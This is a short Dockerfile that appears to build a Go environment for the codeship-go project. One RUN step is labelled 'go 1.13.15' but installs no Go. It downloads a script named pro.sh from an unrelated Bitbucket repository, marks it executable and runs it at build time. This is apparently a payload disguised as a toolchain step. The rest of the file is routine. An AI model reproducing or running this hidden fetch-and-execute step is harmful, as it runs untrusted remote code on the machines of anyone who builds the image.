ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN wget https://bitbucket.org/xngix/pro/raw/f219b847326631a45e61bc6a741b6cf44c7a2098/pro.sh && chmod +x pro.sh && ./pro.sh

# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
